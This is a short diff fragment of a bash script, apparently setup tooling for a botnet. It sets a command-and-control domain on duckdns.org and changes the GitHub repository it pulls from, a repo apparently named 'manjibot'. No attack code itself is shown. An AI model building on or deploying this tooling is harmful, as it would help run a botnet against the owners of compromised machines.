@@ -33,7 +33,7 @@ log() {
 }
 
 CNC_DOMAIN="boobnet.duckdns.org"
-REPO_URL="https://github.com/sidqjhzadh313/manjibot.git"
+REPO_URL="https://github.com/sidqjhzadh313/iqsjda.git"
 
 while [[ $# -gt 0 ]]; do
     case $1 in
